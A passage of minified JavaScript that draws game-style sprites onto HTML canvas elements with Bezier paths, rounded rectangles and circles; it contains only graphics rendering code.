      n.bezierCurveTo(e * 23, e * 78, e * 28, e * 77, e * 36, e * 79);
      n.bezierCurveTo(e * 80, e * 87, e * 120, e * 81, e * 145, e * 76);
      n.closePath();
      ye(n, t[1]);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 38, e * 46);
      n.bezierCurveTo(e * 52, e * 37, e * 69, e * 36, e * 85, e * 36);
      n.bezierCurveTo(e * 118, e * 38, e * 129, e * 42, e * 137, e * 48);
      n.bezierCurveTo(e * 135, e * 45, e * 135, e * 45, e * 133, e * 42);
      n.bezierCurveTo(e * 124, e * 32, e * 116, e * 28, e * 88, e * 25);
      n.bezierCurveTo(e * 47, e * 28, e * 40, e * 32, e * 36, e * 44);
      n.closePath();
      ye(n, t[5]);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 145, e * 75);
      n.bezierCurveTo(e * 143, e * 51, e * 133, e * 29, e * 100, e * 27);
      n.bezierCurveTo(e * 52, e * 21, e * 37, e * 37, e * 31, e * 54);
      n.bezierCurveTo(e * 23, e * 78, e * 28, e * 77, e * 36, e * 79);
      n.bezierCurveTo(e * 80, e * 87, e * 120, e * 81, e * 145, e * 76);
      n.closePath();
      ye(n, undefined, t[2], e * 4);
      n.translate(0, e * -3);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 28, e * 67);
      n.bezierCurveTo(e * 55, e * 80, e * 126, e * 74, e * 144, e * 68);
      n.bezierCurveTo(e * 144.5, e * 75, e * 144.5, e * 75, e * 145, e * 82);
      n.bezierCurveTo(e * 114, e * 94, e * 47, e * 91, e * 28, e * 82);
      n.closePath();
      ye(n, t[10], t[10], e * 4);
      n.translate(0, e * 3);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 131, e * 43);
      n.bezierCurveTo(e * 145, e * 40, e * 148, e * 32, e * 147, e * 17);
      n.bezierCurveTo(e * 166, e * 39, e * 155, e * 62, e * 140, e * 67);
      n.bezierCurveTo(e * 128, e * 65, e * 128, e * 52, e * 131, e * 45);
      n.closePath();
      ye(n, t[3]);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 41, e * 43);
      n.bezierCurveTo(e * 30, e * 42, e * 24, e * 33, e * 25, e * 17);
      n.bezierCurveTo(e * 7, e * 34, e * 17, e * 63, e * 33, e * 66);
      n.bezierCurveTo(e * 45, e * 59, e * 44, e * 53, e * 42, e * 44);
      n.closePath();
      ye(n, t[3]);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 24, e * 19);
      n.bezierCurveTo(e * 24, e * 35, e * 35, e * 42, e * 42, e * 44);
      n.bezierCurveTo(e * 43, e * 51, e * 43, e * 48, e * 43, e * 56);
      n.bezierCurveTo(e * 25, e * 47, e * 17, e * 36, e * 23, e * 20);
      n.closePath();
      ye(n, t[6]);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 148, e * 18);
      n.bezierCurveTo(e * 159, e * 44, e * 139, e * 52, e * 130, e * 55);
      n.bezierCurveTo(e * 129, e * 48, e * 129, e * 46, e * 131, e * 43);
      n.bezierCurveTo(e * 144, e * 37, e * 148, e * 35, e * 147, e * 18);
      n.closePath();
      ye(n, t[6]);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 131, e * 43);
      n.bezierCurveTo(e * 145, e * 40, e * 148, e * 32, e * 147, e * 17);
      n.bezierCurveTo(e * 166, e * 39, e * 155, e * 62, e * 140, e * 67);
      n.bezierCurveTo(e * 128, e * 65, e * 128, e * 52, e * 131, e * 45);
      n.closePath();
      ye(n, undefined, t[4], e * 4);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 41, e * 43);
      n.bezierCurveTo(e * 30, e * 42, e * 24, e * 33, e * 25, e * 17);
      n.bezierCurveTo(e * 7, e * 34, e * 17, e * 63, e * 33, e * 66);
      n.bezierCurveTo(e * 45, e * 59, e * 44, e * 53, e * 42, e * 44);
      n.closePath();
      ye(n, undefined, t[4], e * 4);
      n.save();
      n.translate(e * 87, e * 34.5);
      n.rotate(0);
      Be(n, e * -8, e * -10.5, e * 16, e * 21, e * 10);
      n.restore();
      ye(n, t[7], t[2], e * 4);
      n.save();
      n.translate(e * 87, e * 57);
      n.rotate(0);
      Be(n, e * -8, e * -23, e * 16, e * 46, e * 10);
      n.restore();
      ye(n, t[8], t[2], e * 4);
      ze(n, e * 87, e * 39, e * 4.123105625617661);
      ye(n, t[9], t[2], e * 4);
      ze(n, e * 87, e * 60, e * 4.242640687119285);
      ye(n, t[9], t[2], e * 4);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 28, e * 67);
      n.bezierCurveTo(e * 55, e * 80, e * 126, e * 74, e * 144, e * 68);
      n.bezierCurveTo(e * 144.5, e * 75, e * 144.5, e * 75, e * 145, e * 82);
      n.bezierCurveTo(e * 114, e * 94, e * 47, e * 91, e * 28, e * 82);
      n.closePath();
      ye(n, t[8], t[2], e * 4);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 27, e * 69);
      n.bezierCurveTo(e * 13, e * 77, e * 16, e * 74, e * 27, e * 80);
      n.closePath();
      ye(n, t[9], t[2], e * 4);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 145, e * 70);
      n.bezierCurveTo(e * 149.5, e * 72, e * 149.5, e * 72, e * 154, e * 74);
      n.bezierCurveTo(e * 150, e * 77, e * 150, e * 77, e * 146, e * 80);
      n.closePath();
      ye(n, t[9], t[2], e * 4);
      ze(n, e * 50, e * 80, e * 5);
      ye(n, t[9], t[2], e * 4);
      ze(n, e * 86.01141357421875, e * 81.76705932617188, e * 5);
      ye(n, t[9], t[2], e * 4);
      ze(n, e * 119.01141357421875, e * 80.13069152832031, e * 5);
      ye(n, t[9], t[2], e * 4);
      return r;
    }
    function cr(e, i, t) {
      var r = document.createElement("canvas");
      var n = r.getContext("2d");
      r.width = e * 142;
      r.height = e * 118;
      n.save();
      n.translate(e * 70.16665649414062, e * 38.20831298828125);
      Be(n, e * -58.5, e * -27.5, e * 117, e * 55, e * 20);
      n.restore();
      ye(n, t[0], t[1], e * 4);
      n.save();
      n.translate(e * 70, e * 42.70831298828125);
      Be(n, e * -61, e * -20, e * 122, e * 40, e * 20);
      n.restore();
      ye(n, t[2], t[1], e * 4);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 123, e * 70.375);
      n.bezierCurveTo(e * 115, e * 99.375, e * 119, e * 85.375, e * 115, e * 100.375);
      n.bezierCurveTo(e * 112, e * 116.375, e * 117, e * 109.375, e * 131, e * 100.375);
      n.bezierCurveTo(e * 131, e * 83.375, e * 131, e * 83.375, e * 131, e * 66.375);
      n.closePath();
      ye(n, t[2], t[1], e * 4);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 11, e * 68.375);
      n.bezierCurveTo(e * 11.166656494140625, e * 84.375, e * 9, e * 99.375, e * 10, e * 100.375);
      n.bezierCurveTo(e * 35, e * 113.375, e * 27, e * 110.375, e * 25, e * 95.375);
      n.bezierCurveTo(e * 16, e * 68.375, e * 17, e * 69.375, e * 17, e * 68.375);
      n.closePath();
      ye(n, t[2], t[1], e * 4);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 46, e * 32.375);
      n.bezierCurveTo(e * 43, e * 8.375, e * 45, e * 7.375, e * 56, e * 6.375);
      n.bezierCurveTo(e * 105, e * 4.375, e * 102, e * 6.375, e * 97, e * 32.375);
      n.bezierCurveTo(e * 138, e * 43.375, e * 133, e * 45.375, e * 133, e * 58.375);
      n.bezierCurveTo(e * 133, e * 85.375, e * 125, e * 74.375, e * 111, e * 70.375);
      n.bezierCurveTo(e * 70, e * 69.875, e * 29, e * 69.375, e * 29, e * 69.375);
      n.bezierCurveTo(e * 7, e * 84.375, e * 7, e * 70.375, e * 7, e * 59.375);
      n.bezierCurveTo(e * 6, e * 28.375, e * 32, e * 39.375, e * 44, e * 32.375);
      n.closePath();
      ye(n, t[2], t[1], e * 4);
      ze(n, e * 71, e * 44.375, e * 16.55294535724685);
      ye(n, t[2], t[1], e * 4);
      ze(n, e * 71, e * 43.70831298828125, e * 8.94427190999916);
      ye(n, t[2], t[1], e * 4);
      return r;
    }
    function Rr(e, i, t) {
      var r = document.createElement("canvas");
      var n = r.getContext("2d");
      r.width = e * 142;
      r.height = e * 118;
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 111, e * 27.3671875);
      n.bezierCurveTo(e * 128, e * 9.3671875, e * 125, e * 13.3671875, e * 126, e * 21.3671875);
      n.bezierCurveTo(e * 126, e * 33.3671875, e * 119, e * 43.3671875, e * 118, e * 42.3671875);
      n.closePath();
      ye(n, t[3], t[4], e * 4);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 31, e * 23.3671875);
      n.bezierCurveTo(e * 17, e * 15.3671875, e * 16, e * 14.3671875, e * 17, e * 20.3671875);
      n.bezierCurveTo(e * 22, e * 33.3671875, e * 20, e * 27.3671875, e * 24, e * 34.3671875);
      n.closePath();
      ye(n, t[3], t[4], e * 4);
      n.save();
      n.translate(e * 70.5, e * 34.8671875);
      n.rotate(0);
      Be(n, e * -49.5, e * -21.5, e * 99, e * 43, e * 15);
      n.restore();
      ye(n, t[0], t[1], e * 4);
      n.save();
      n.translate(e * 71, e * 40.8671875);
      n.rotate(0);
      Be(n, e * -49, e * -12.5, e * 98, e * 25, e * 15);
      n.restore();
      ye(n, t[2], t[1], e * 4);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 19.800003051757812, e * 75.95625305175781);
      n.bezierCurveTo(e * 19.300003051757812, e * 82.95625305175781, e * 19.300003051757812, e * 82.95625305175781, e * 18.800003051757812, e * 89.95625305175781);
      n.bezierCurveTo(e * 38.80000305175781, e * 115.95625305175781, e * 37.80000305175781, e * 104.95625305175781, e * 31.800003051757812, e * 91.95625305175781);
      n.closePath();
      ye(n, t[2], t[1], e * 4);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 119.80000305175781, e * 75.95625305175781);
      n.bezierCurveTo(e * 120.80000305175781, e * 82.95625305175781, e * 120.80000305175781, e * 82.95625305175781, e * 121.80000305175781, e * 89.95625305175781);
      n.bezierCurveTo(e * 101.80000305175781, e * 111.95625305175781, e * 99.80000305175781, e * 111.95625305175781, e * 112.80000305175781, e * 81.95625305175781);
      n.closePath();
      ye(n, t[2], t[1], e * 4);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 17.800003051757812, e * 49.15625);
      n.bezierCurveTo(e * 17.800003051757812, e * 64.15625, e * 17.800003051757812, e * 64.15625, e * 17.800003051757812, e * 79.15625);
      n.bezierCurveTo(e * 23.300003051757812, e * 85.15625, e * 23.300003051757812, e * 85.15625, e * 28.800003051757812, e * 91.15625);
      n.bezierCurveTo(e * 36.80000305175781, e * 96.15625, e * 32.80000305175781, e * 91.15625, e * 28.800003051757812, e * 77.15625);
      n.bezierCurveTo(e * 33.80000305175781, e * 65.15625, e * 33.80000305175781, e * 65.15625, e * 38.80000305175781, e * 53.15625);
      n.closePath();
      ye(n, t[3], t[4], e * 4);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 123.80000305175781, e * 53.95625305175781);
      n.bezierCurveTo(e * 121.80000305175781, e * 77.95625305175781, e * 121.80000305175781, e * 74.95625305175781, e * 121.80000305175781, e * 78.95625305175781);
      n.bezierCurveTo(e * 115.80000305175781, e * 84.95625305175781, e * 115.80000305175781, e * 84.95625305175781, e * 109.80000305175781, e * 90.95625305175781);
      n.bezierCurveTo(e * 102.80000305175781, e * 93.95625305175781, e * 105.80000305175781, e * 86.95625305175781, e * 110.80000305175781, e * 76.95625305175781);
      n.bezierCurveTo(e * 107.30000305175781, e * 65.45625305175781, e * 103.80000305175781, e * 53.95625305175781, e * 103.80000305175781, e * 53.95625305175781);
      n.closePath();
      ye(n, t[3], t[4], e * 4);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 18, e * 56.3671875);
      n.bezierCurveTo(e * 70, e * 56.8671875, e * 70, e * 56.8671875, e * 122, e * 57.3671875);
      n.bezierCurveTo(e * 137, e * 20.3671875, e * 137, e * 16.3671875, e * 126, e * 22.3671875);
      n.bezierCurveTo(e * 115.5, e * 34.3671875, e * 115.5, e * 34.3671875, e * 105, e * 46.3671875);
      n.bezierCurveTo(e * 70.5, e * 46.3671875, e * 70.5, e * 46.3671875, e * 36, e * 46.3671875);
      n.bezierCurveTo(e * 4, e * 14.3671875, e * 7, e * 18.3671875, e * 8, e * 27.3671875);
      n.bezierCurveTo(e * 12.5, e * 41.8671875, e * 12.5, e * 41.8671875, e * 17, e * 56.3671875);
      n.closePath();
      ye(n, t[3], t[4], e * 4);
      n.save();
      n.translate(e * 68.30000305175781, e * 41.45625305175781);
      n.rotate(0.76);
      Be(n, e * -20.5, e * -20.5, e * 41, e * 41, e * 10);
      n.restore();
      ye(n, undefined, t[5], e * 4);
      n.save();
      n.translate(e * 68.80000305175781, e * 44.45625305175781);
      n.rotate(0.76);
      Be(n, e * -21, e * -20.5, e * 42, e * 41, e * 10);
      n.restore();
      ye(n, t[3], t[4], e * 4);
      n.save();
      n.translate(e * 69.80000305175781, e * 44.556243896484375);
      n.rotate(0.76);
      Be(n, e * -10, e * -10, e * 20, e * 20, e * 5);
      n.restore();
      ye(n, t[6], t[7], e * 4);
      return r;
    }
    function gr(e, i, t) {
      var r = document.createElement("canvas");
      var n = r.getContext("2d");
      r.width = e * 145;
      r.height = e * 120;
      n.beginPath();
      n.scale(0.6, 0.6);
      n.lineCap = "round";
      n.lineJoin = "round";
      n.translate(e * 18, e * -8);
      n.moveTo(e * 101, e * 72);
      n.bezierCurveTo(e * 144, e * 69, e * 149, e * 58, e * 162, e * 49);
      n.bezierCurveTo(e * 174, e * 31, e * 173, e * 38, e * 172, e * 45);
      n.bezierCurveTo(e * 168, e * 73, e * 158, e * 75, e * 152, e * 78);
      n.bezierCurveTo(e * 106, e * 89, e * 107, e * 91, e * 107, e * 94);
      n.bezierCurveTo(e * 107, e * 100, e * 107, e * 107, e * 107, e * 107);
      n.bezierCurveTo(e * 99, e * 112, e * 98, e * 110, e * 93, e * 107);
      n.bezierCurveTo(e * 94, e * 107, e * 93, e * 107, e * 93, e * 107);
      n.bezierCurveTo(e * 93, e * 100, e * 93, e * 100, e * 92, e * 94);
      n.bezierCurveTo(e * 92, e * 89, e * 90, e * 90, e * 73, e * 86);
      n.bezierCurveTo(e * 45, e * 81, e * 40, e * 77, e * 35, e * 68);
      n.bezierCurveTo(e * 23, e * 36, e * 28, e * 34, e * 36, e * 46);
      n.bezierCurveTo(e * 45, e * 58, e * 83, e * 72, e * 98, e * 72);
      n.closePath();
      ye(n, t[4], t[5], e * 4);
      n.beginPath();
      n.scale(1.1, 1.1);
      n.lineCap = "round";
      n.lineJoin = "round";
      n.translate(e * -9, e * 4);
      n.moveTo(e * 101, e * 72);
      n.bezierCurveTo(e * 144, e * 69, e * 149, e * 58, e * 162, e * 49);
      n.bezierCurveTo(e * 174, e * 31, e * 173, e * 38, e * 172, e * 45);
      n.bezierCurveTo(e * 168, e * 73, e * 158, e * 75, e * 152, e * 78);
      n.bezierCurveTo(e * 106, e * 89, e * 107, e * 91, e * 107, e * 94);
      n.bezierCurveTo(e * 107, e * 100, e * 107, e * 107, e * 107, e * 107);
      n.bezierCurveTo(e * 99, e * 112, e * 98, e * 110, e * 93, e * 107);
      n.bezierCurveTo(e * 94, e * 107, e * 93, e * 107, e * 93, e * 107);
      n.bezierCurveTo(e * 93, e * 100, e * 93, e * 100, e * 92, e * 94);
      n.bezierCurveTo(e * 92, e * 89, e * 90, e * 90, e * 73, e * 86);
      n.bezierCurveTo(e * 45, e * 81, e * 40, e * 77, e * 35, e * 68);
      n.bezierCurveTo(e * 23, e * 36, e * 28, e * 34, e * 36, e * 46);
      n.bezierCurveTo(e * 45, e * 58, e * 83, e * 72, e * 98, e * 72);
      n.closePath();
      ye(n, t[4], t[5], e * 4);
      n.scale(1.1, 1.1);
      n.translate(e * -9, e * 4);
      n.save();
      n.translate(e * 100, e * 73.06874084472656);
      n.rotate(0);
      Be(n, e * -61, e * -38.5, e * 122, e * 40, e * 20);
      n.restore();
      ye(n, t[1], t[2], e * 4);
      n.save();
      n.translate(e * 100, e * 71.36874389648438);
      n.rotate(0);
      Be(n, e * -60.5, e * -18, e * 121, e * 30, e * 20);
      n.restore();
      ye(n, t[3], t[2], e * 4);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 144, e * 80);
      n.bezierCurveTo(e * 152, e * 100, e * 152, e * 101, e * 153, e * 102);
      n.bezierCurveTo(e * 159, e * 100, e * 159, e * 100, e * 160, e * 100);
      n.bezierCurveTo(e * 161, e * 84, e * 161, e * 84, e * 162, e * 68);
      n.closePath();
      ye(n, t[2]);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 57, e * 75);
      n.bezierCurveTo(e * 48, e * 101, e * 53, e * 89, e * 48, e * 102);
      n.bezierCurveTo(e * 44, e * 100, e * 44, e * 100, e * 39, e * 97);
      n.bezierCurveTo(e * 39, e * 83, e * 39, e * 83, e * 39, e * 69);
      n.closePath();
      ye(n, t[2]);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 101, e * 72);
      n.bezierCurveTo(e * 144, e * 69, e * 149, e * 58, e * 162, e * 49);
      n.bezierCurveTo(e * 174, e * 31, e * 173, e * 38, e * 172, e * 45);
      n.bezierCurveTo(e * 168, e * 73, e * 158, e * 75, e * 152, e * 78);
      n.bezierCurveTo(e * 106, e * 89, e * 107, e * 91, e * 107, e * 94);
      n.bezierCurveTo(e * 107, e * 100, e * 107, e * 107, e * 107, e * 107);
      n.bezierCurveTo(e * 99, e * 112, e * 98, e * 110, e * 93, e * 107);
      n.bezierCurveTo(e * 94, e * 107, e * 93, e * 107, e * 93, e * 107);
      n.bezierCurveTo(e * 93, e * 100, e * 93, e * 100, e * 92, e * 94);
      n.bezierCurveTo(e * 92, e * 89, e * 90, e * 90, e * 73, e * 86);
      n.bezierCurveTo(e * 45, e * 81, e * 40, e * 77, e * 35, e * 68);
      n.bezierCurveTo(e * 23, e * 36, e * 28, e * 34, e * 36, e * 46);
      n.bezierCurveTo(e * 45, e * 58, e * 83, e * 72, e * 98, e * 72);
      n.closePath();
      ye(n, t[4], t[5], e * 4);
      n.translate(0, 0);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 115.5, e * 116.07290649414062);
      n.bezierCurveTo(e * 159.5, e * 99.07290649414062, e * 159.5, e * 98.07290649414062, e * 159.5, e * 98.07290649414062);
      n.bezierCurveTo(e * 155.5, e * 116.07290649414062, e * 159.5, e * 116.07290649414062, e * 159.5, e * 118.07290649414062);
      n.bezierCurveTo(e * 147.5, e * 130.07290649414062, e * 136.5, e * 132.07290649414062, e * 115.5, e * 138.07290649414062);
      n.closePath();
      ye(n, t[3], t[2], e * 4);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 39.5, e * 96.07290649414062);
      n.bezierCurveTo(e * 85.5, e * 114.07290649414062, e * 62.5, e * 105.57290649414062, e * 85.5, e * 115.07290649414062);
      n.bezierCurveTo(e * 85.5, e * 125.57290649414062, e * 85.5, e * 125.57290649414062, e * 85.5, e * 136.07290649414062);
      n.bezierCurveTo(e * 51.5, e * 129.07290649414062, e * 51.5, e * 125.07290649414062, e * 41.5, e * 118.07290649414062);
      n.bezierCurveTo(e * 44.5, e * 106.07290649414062, e * 42.5, e * 103.07290649414062, e * 40.5, e * 96.07290649414062);
      n.closePath();
      ye(n, t[3], t[2], e * 4);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 86, e * 80);
      n.bezierCurveTo(e * 97, e * 88, e * 106, e * 84, e * 112, e * 80);
      n.bezierCurveTo(e * 112, e * 62, e * 106, e * 59, e * 99, e * 54);
      n.bezierCurveTo(e * 86, e * 62, e * 86, e * 73, e * 86, e * 80);
      n.closePath();
      ye(n, t[3], t[2], e * 4);
      n.scale(0.5, 0.5);
      n.translate(e * 100, e * 71);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 86, e * 80);
      n.bezierCurveTo(e * 97, e * 88, e * 106, e * 84, e * 112, e * 80);
      n.bezierCurveTo(e * 112, e * 62, e * 106, e * 59, e * 99, e * 54);
      n.bezierCurveTo(e * 86, e * 62, e * 86, e * 73, e * 86, e * 80);
      n.closePath();
      ye(n, t[6], t[2], e * 4);
      return r;
    }
    function Cr(e, i, t) {
      var r = document.createElement("canvas");
      var n = r.getContext("2d");
      r.width = e * 400;
      r.height = e * 400;
      n.save();
      n.translate(e * 204, e * 195.0833282470703);
      n.rotate(10.16);
      Be(n, e * -97.5, e * -134.5, e * 195, e * 269, e * 10);
      n.restore();
      ye(n, t[0], t[1], e * 8);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 58.5, e * 226.5833282470703);
      n.bezierCurveTo(e * 120.5, e * 281.5833282470703, e * 120.5, e * 281.5833282470703, e * 182.5, e * 336.5833282470703);
      n.bezierCurveTo(e * 263, e * 248.5833282470703, e * 263, e * 248.5833282470703, e * 343.5, e * 160.5833282470703);
      n.bezierCurveTo(e * 280.5, e * 104.58332824707031, e * 280.5, e * 104.58332824707031, e * 217.5, e * 48.58332824707031);
      n.closePath();
      ye(n, t[2], t[3], e * 4);
      n.save();
      n.translate(e * 197, e * 169.0833282470703);
      n.rotate(10.16);
      Be(n, e * -93.5, e * -126.5, e * 187, e * 253, e * 10);
      n.restore();
      ye(n, t[4], t[1], e * 8);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 226.5, e * 24.583328247070312);
      n.bezierCurveTo(e * 58.5, e * 207.5833282470703, e * 143, e * 116.58332824707031, e * 59.5, e * 208.5833282470703);
      n.closePath();
      ye(n, undefined, t[1], e * 8);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 46.133331298828125, e * 202.64999389648438);
      n.bezierCurveTo(e * 46.133331298828125, e * 215.64999389648438, e * 46.133331298828125, e * 215.64999389648438, e * 46.133331298828125, e * 228.64999389648438);
      n.closePath();
      ye(n, t[4], t[1], e * 8);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 55.133331298828125, e * 211.64999389648438);
      n.bezierCurveTo(e * 55.133331298828125, e * 225.14999389648438, e * 55.133331298828125, e * 225.14999389648438, e * 55.133331298828125, e * 238.64999389648438);
      n.bezierCurveTo(e * 50.133331298828125, e * 235.64999389648438, e * 50.133331298828125, e * 235.64999389648438, e * 45.133331298828125, e * 232.64999389648438);
      n.bezierCurveTo(e * 45.133331298828125, e * 216.64999389648438, e * 45.133331298828125, e * 216.64999389648438, e * 45.133331298828125, e * 200.64999389648438);
      n.closePath();
      ye(n, t[4], t[1], e * 8);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 46.133331298828125, e * 198.39999389648438);
      n.bezierCurveTo(e * 46.133331298828125, e * 199.89999389648438, e * 46.133331298828125, e * 199.89999389648438, e * 46.133331298828125, e * 201.39999389648438);
      n.closePath();
      ye(n, t[4], t[1], e * 8);
      n.save();
      n.translate(e * 249.63333129882812, e * 120.89999389648438);
      n.rotate(7.04);
      Be(n, e * -58.5, e * -32, e * 117, e * 64, e * 10);
      n.restore();
      ye(n, t[5]);
      return r;
    }
    function Nr(e, i, t) {
      var r = document.createElement("canvas");
      var n = r.getContext("2d");
      r.width = e * 170;
      r.height = e * 170;
      n.globalAlpha = i ? 0.5 : 1;
      n.translate(e * -10, e * 10);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 72.5, e * 4.109375);
      n.bezierCurveTo(e * 117, e * 9.609375, e * 117, e * 9.609375, e * 161.5, e * 15.109375);
      n.bezierCurveTo(e * 134.5, e * 106.109375, e * 110.5, e * 130.109375, e * 63.5, e * 145.109375);
      n.bezierCurveTo(e * 33.5, e * 120.609375, e * 33.5, e * 120.609375, e * 3.5, e * 96.109375);
      n.bezierCurveTo(e * 82.5, e * 75.109375, e * 69.5, e * 29.109375, e * 71.5, e * 6.109375);
      n.closePath();
      ye(n, t[0]);
      n.globalAlpha = 1;
      n.translate(e * 10, e * -10);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 72.5, e * 4.109375);
      n.bezierCurveTo(e * 117, e * 9.609375, e * 117, e * 9.609375, e * 161.5, e * 15.109375);
      n.bezierCurveTo(e * 134.5, e * 106.109375, e * 110.5, e * 130.109375, e * 63.5, e * 145.109375);
      n.bezierCurveTo(e * 33.5, e * 120.609375, e * 33.5, e * 120.609375, e * 3.5, e * 96.109375);
      n.bezierCurveTo(e * 82.5, e * 75.109375, e * 69.5, e * 29.109375, e * 71.5, e * 6.109375);
      n.closePath();
      ye(n, t[1], t[2], e * 10);
      return r;
    }
    function br(e, i, t) {
      var r = (n = document.createElement("canvas")).getContext("2d");
      n.width = e * 47;
      n.height = e * 60;
      var n;
      r = (n = document.createElement("canvas")).getContext("2d");
      n.width = e * 47;
      n.height = e * 60;
      ze(r, e * 23.5, e * 20.734375, e * 15.132745950421556);
      ye(r, undefined, t[2], e * 4);
      ze(r, e * 23.5, e * 20.734375, e * 18.601075237738275);
      ye(r, undefined, t[1], e * 4);
      ze(r, e * 23.5, e * 20.734375, e * 11.40175425099138);
      ye(r, undefined, t[1], e * 4);
      r.save();
      r.translate(e * 23, e * 38.734375);
      r.rotate(0);
      Be(r, e * -21.5, e * -19, e * 43, e * 38, e * 10);
      r.restore();
      ye(r, t[2], t[1], e * 4);
      r.save();
      r.translate(e * 23.5, e * 43.734375);
      r.rotate(0.5235987755982988);
      Ve(r, 3, e * 8.06225774829855, e * 0);
      r.restore();
      ye(r, t[3]);
      ze(r, e * 23.5, e * 35.734375, e * 7.0710678118654755);
      ye(r, t[3]);
      return n;
    }
    function Dr(e, i, t, r) {
      var n = document.createElement("canvas");
      var a = n.getContext("2d");
      n.width = e * 501;
      n.height = e * 564;
      a.scale(0.5, 0.5);
      a.translate(e * 240, e * 255);
      a.rotate(r);
      a.globalAlpha = i ? 0.5 : 0.2;
      ze(a, e * 174, e * 87.984375, e * 20.8806130178211);
      ye(a, t[0], t[0], e * 8);
      ze(a, e * 174, e * 87.984375, e * 12.165525060596439);
      ye(a, t[0], t[0], e * 8);
      ze(a, e * 174, e * 87.484375, e * 6);
      ye(a, t[0]);
      ze(a, e * 30, e * 87.984375, e * 20.8806130178211);
      ye(a, t[0], t[0], e * 4);
      ze(a, e * 30, e * 87.984375, e * 12.165525060596439);
      ye(a, t[0], t[0], e * 4);
      ze(a, e * 30, e * 87.484375, e * 6);
      ye(a, t[0]);
      ze(a, e * 100, e * 30, e * 20.8806130178211);
      ye(a, t[0], t[0], e * 4);
      ze(a, e * 100, e * 30, e * 12.165525060596439);
      ye(a, t[0], t[0], e * 4);
      ze(a, e * 100, e * 30, e * 6);
      ye(a, t[0]);
      ze(a, e * 100, e * 130, e * 20.8806130178211);
      ye(a, t[0], t[0], e * 4);
      ze(a, e * 100, e * 130, e * 12.165525060596439);
      ye(a, t[0], t[0], e * 4);
      ze(a, e * 100, e * 130, e * 6);
      ye(a, t[0]);
      a.save();
      a.translate(e * 102, e * 81.984375);
      a.rotate(0);
      Be(a, e * -74, e * -57, e * 148, e * 114, e * 23);
      a.restore();
      ye(a, t[0], t[0], e * 4);
      a.save();
      a.translate(e * 101, e * 64.984375);
      a.rotate(0);
      Be(a, e * -33, e * -10, e * 66, e * 20, e * 15);
      a.restore();
      ye(a, t[0], t[0], e * 4);
      a.save();
      a.translate(e * 102, e * 63.484375);
      a.rotate(0);
      Be(a, e * -9, e * -27.5, e * 18, e * 55, e * 15);
      a.restore();
      a.translate(5, -5);
      a.globalAlpha = 1;
      ze(a, e * 174, e * 87.984375, e * 20.8806130178211);
      ye(a, t[1], t[3], e * 8);
      ze(a, e * 174, e * 87.984375, e * 12.165525060596439);
      ye(a, t[1], t[3], e * 8);
      ze(a, e * 174, e * 87.484375, e * 6);
      ye(a, t[2]);
      ze(a, e * 30, e * 87.984375, e * 20.8806130178211);
      ye(a, t[1], t[3], e * 8);
      ze(a, e * 30, e * 87.984375, e * 12.165525060596439);
      ye(a, t[1], t[3], e * 8);
      ze(a, e * 30, e * 87.484375, e * 6);
      ye(a, t[2]);
      ze(a, e * 102, e * 30, e * 20.8806130178211);
      ye(a, t[1], t[3], e * 8);
      ze(a, e * 102, e * 30, e * 12.165525060596439);
      ye(a, t[1], t[3], e * 8);
      ze(a, e * 102, e * 30, e * 6);
      ye(a, t[1]);
      ze(a, e * 102, e * 130, e * 20.8806130178211);
      ye(a, t[1], t[3], e * 8);
      ze(a, e * 102, e * 130, e * 12.165525060596439);
      ye(a, t[1], t[3], e * 8);
      ze(a, e * 102, e * 130, e * 6);
      ye(a, t[1]);
      a.save();
      a.translate(e * 102, e * 81.984375);
